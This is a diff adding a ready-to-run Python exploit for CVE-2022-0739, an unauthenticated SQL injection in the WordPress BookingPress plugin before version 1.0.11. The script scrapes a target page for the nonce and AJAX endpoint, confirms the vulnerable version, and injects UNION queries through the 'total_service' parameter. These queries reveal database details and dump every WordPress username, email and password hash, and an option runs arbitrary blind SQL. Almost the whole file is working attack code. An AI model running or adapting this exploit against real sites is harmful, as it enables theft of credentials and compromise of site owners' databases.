@@ -1,0 +1,201 @@
+import argparse
+import re
+import requests
+import rich
+import rich.table
+import sys
+from dataclasses import dataclass
+from typing import Any, List, Tuple
+
+ASCII_ART = """
+
+░█████╗░██╗░░░██╗███████╗░░░░░░██████╗░░█████╗░██████╗░██████╗░░░░░░░░█████╗░███████╗██████╗░░█████╗░
+██╔══██╗██║░░░██║██╔════╝░░░░░░╚════██╗██╔══██╗╚════██╗╚════██╗░░░░░░██╔══██╗╚════██║╚════██╗██╔══██╗
+██║░░╚═╝╚██╗░██╔╝█████╗░░█████╗░░███╔═╝██║░░██║░░███╔═╝░░███╔═╝█████╗██║░░██║░░░░██╔╝░█████╔╝╚██████║
+██║░░██╗░╚████╔╝░██╔══╝░░╚════╝██╔══╝░░██║░░██║██╔══╝░░██╔══╝░░╚════╝██║░░██║░░░██╔╝░░╚═══██╗░╚═══██║
+╚█████╔╝░░╚██╔╝░░███████╗░░░░░░███████╗╚█████╔╝███████╗███████╗░░░░░░╚█████╔╝░░██╔╝░░██████╔╝░█████╔╝
+░╚════╝░░░░╚═╝░░░╚══════╝░░░░░░╚══════╝░╚════╝░╚══════╝╚══════╝░░░░░░░╚════╝░░░╚═╝░░░╚═════╝░░╚════╝░
+PoC for [bold yellow]CVE-2022-0739[/bold yellow] - Wordpress BookingPresss Plugin Version < [bold yellow]1.0.11[/bold yellow]
+"""
+
+AJAX_RE = re.compile(r'"ajax_url":"([^"]*)"')
+NONCE_RE = re.compile(r"_wpnonce:'([^']+)'")
+TITLE_RE = re.compile(r"<title>(.*)</title>")
+VERSION_RE = re.compile(r"bookingpress_axios.*ver=([^']+)'")
+
+# ---------------------------------------------------------------------------------------------------------------------
+def error(txt: str):
+    rich.print(f"[red][-] Error: [/red]{txt}")
+    sys.exit(1)
+
+# ---------------------------------------------------------------------------------------------------------------------
+def status(txt: str, prefix=""):
+    rich.print(prefix + f"[blue][*][/blue] {txt}")
+
+# ---------------------------------------------------------------------------------------------------------------------
+def success(txt: str, prefix=""):
+    rich.print(prefix + f"[green][+][/green] {txt}")
+
+# ---------------------------------------------------------------------------------------------------------------------
+@dataclass
+class TargetParams:
+    ajax_url: str
+    nonce: str
+    version: str
+
+# ---------------------------------------------------------------------------------------------------------------------
+def get_params(url: str) -> TargetParams:
+    status(f"Requesting: {url}")
+    try:
+        resp = requests.get(url)
+    except requests.exceptions.RequestException as err:
+        error(str(err))
+
+    if not resp.ok:
+        error(f"[blue]{resp.status_code}[/blue] {resp.reason}")
+    
+    if (match := TITLE_RE.search(resp.text)):
+        title = match.groups(0)[0]
+    else:
+        title = ""
+    
+    status(f"Got Page. Title: '{title}'")
+
+    if not (match := VERSION_RE.search(resp.text)):
+        error("Unable to locate BookingPress plugin version")
+    
+    version = str(match.groups(0)[0])
+    
+    try:
+        (major, minor, revision) = tuple(int(x) for x in version.split("."))
+        if major > 1 or (major < 1 and minor > 0) or revision > 10:
+            error(f"Version not vulnerable: [bold yellow]{version}[/bold yellow]")
+        success(f"Vulnerable version detected: [bold green]{version}[/bold green]")
+    except Exception:
+        error(f"Failed to parse version: {version}")
+
+    if not (match := NONCE_RE.search(resp.text)):
+        error("Unable to locate Nonce")
+
+    nonce = str(match.groups(0)[0])
+    success(f"Got Nonce: [bold green]{nonce}[/bold green]")    
+    
+    if not (match := AJAX_RE.search(resp.text)):
+        error("Unable to locate AJAX URL")
+
+    ajax_url = str(match.groups(0)[0]).replace("\\","")
+    success(f"Got AJAX URL: [bold green]{ajax_url}[/bold green]")      
+
+    return TargetParams(ajax_url, nonce, version)
+
+# ---------------------------------------------------------------------------------------------------------------------
+def data_query(params: TargetParams, query: str) -> Tuple[Any, Any, Any, Any, Any, Any, Any, Any, Any]:
+    status(f"Running Data Query: [cyan]{query}[/cyan]", prefix="\t")
+    post_data = {
+        "action": "bookingpress_front_get_category_services",
+        "_wpnonce": params.nonce,
+        "category_id": 1,
+        "total_service": f"-7502) UNION ALL ({query})-- -"
+
+    }
+    resp = requests.post(url=params.ajax_url, data=post_data)
+    
+    if not resp.ok:
+        error(f"[blue]{resp.status_code}[/blue] {resp.reason}")
+    
+    try:
+        json_data = resp.json()[0]
+    except Exception:
+        error("Data Query Failed. Probably Malformed.")
+
+    return (
+        json_data["bookingpress_service_id"],
+        json_data["bookingpress_category_id"],
+        json_data["bookingpress_service_name"],
+        json_data["service_price_without_currency"],
+        json_data["bookingpress_service_duration_val"],
+        json_data["bookingpress_service_duration_unit"],
+        json_data["bookingpress_service_description"],
+        json_data["bookingpress_service_position"],
+        json_data["bookingpress_servicedate_created"]
+    )
+
+# ---------------------------------------------------------------------------------------------------------------------
+def version_info(params: TargetParams) -> Tuple[str, str, str, str ,str]:
+    version_query = "SELECT VERSION(),@@version_comment,@@version_compile_os,0,USER(),DATABASE(),7,8,9"
+    version, comment, os, _, user, db, *_ = data_query(params, version_query)
+    return version, comment, os, user, db
+
+# ---------------------------------------------------------------------------------------------------------------------
+def blind_exec(params: TargetParams, query: str):
+    status("Performing Blind SQL Injection...")
+    status(f"Blind Query: [cyan]{query}[/cyan]", prefix="\t")
+    post_data = {
+        "action": "bookingpress_front_get_category_services",
+        "_wpnonce": params.nonce,
+        "category_id": 1,
+        "total_service": f"1) AND ({query})-- -"
+
+    }
+    resp = requests.post(url=params.ajax_url, data=post_data)
+    
+    if not resp.ok:
+        error(f"[blue]{resp.status_code}[/blue] {resp.reason}")
+    
+    success(f"Blind Inject finished in [bold green]{resp.elapsed.total_seconds()}[/bold green] seconds")
+
+# ---------------------------------------------------------------------------------------------------------------------
+def leak_creds(params: TargetParams) -> List[Tuple[str, str, str]]:
+    user_count, *_ = data_query(params, "SELECT COUNT(*),2,3,4,5,6,7,8,9 FROM wp_users")
+    success(f"User Count: {user_count}")
+
+    creds = []
+    for idx in range(0, int(user_count)):
+        query = f"SELECT user_login,user_email,user_pass,4,5,6,7,8,9 FROM wp_users LIMIT 1 OFFSET {idx}"
+        username, email, password, *_ = data_query(params, query)
+        creds.append((username, email, password))
+    return creds
+
+# ---------------------------------------------------------------------------------------------------------------------
+def cli():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', "--url", required=True, help="URL of the page containing the BookingPress Widget")
+    parser.add_argument('-e', "--exec", help="Optional query for Blind SQL Injection")
+    args = parser.parse_args()
+    rich.print(ASCII_ART)
+
+    params: TargetParams = get_params(args.url)
+
+    if args.exec:
+        blind_exec(params, args.exec)
+        return
+
+    status("Fetching Target Info...")
+    version, comment, os, db, user = version_info(params)
+    success("Target Info:")
+    success(f"Version         : {version}", prefix="\t")
+    success(f"Version Comment : {comment}", prefix="\t")
+    success(f"Compile OS      : {os}", prefix="\t")
+    success(f"Database        : {db}", prefix="\t")
+    success(f"User            : {user}", prefix="\t")
+
+
+    status("Leaking Wordpress Credentials...")
+    creds = leak_creds(params)
+
+    table = rich.table.Table()
+    table.add_column("Username")
+    table.add_column("Email")
+    table.add_column("Password Hash")
+
+    for cred in creds:
+        table.add_row(*cred)
+    
+    print("")
+    rich.print(table)
+
+
+# ---------------------------------------------------------------------------------------------------------------------
+if __name__ == '__main__':
+    cli()
+    
